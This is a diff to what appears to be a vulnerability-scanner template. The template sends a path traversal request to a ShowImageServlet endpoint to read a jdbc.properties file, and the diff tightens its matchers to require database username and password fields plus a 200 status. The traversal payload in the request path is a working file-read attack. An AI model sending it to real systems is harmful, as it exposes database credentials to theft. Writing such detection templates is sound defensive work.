@@ -20,9 +20,14 @@ requests:
   - method: GET
     path:
       - "{{BaseURL}}/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print"
+    matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-          - "jdbc"
-          - "fe.db"
+          - "jdbc.user"
+          - "jdbc.password"
+        condition: and
+      - type: status
+        status:
+          - 200
